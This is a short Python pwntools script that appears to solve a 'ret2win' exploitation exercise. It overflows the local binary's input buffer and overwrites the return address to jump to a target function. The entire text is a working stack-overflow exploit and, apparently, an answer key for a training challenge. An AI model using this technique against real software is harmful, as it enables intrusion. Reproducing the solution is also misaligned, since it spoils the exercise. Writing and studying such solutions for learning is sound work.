from pwn import * 
p=process("ret2win")
p.recvuntil(b"> ")
p.sendline(b"a"*0x28+p64(0x00400770)+p64(0x00400756))
p.interactive()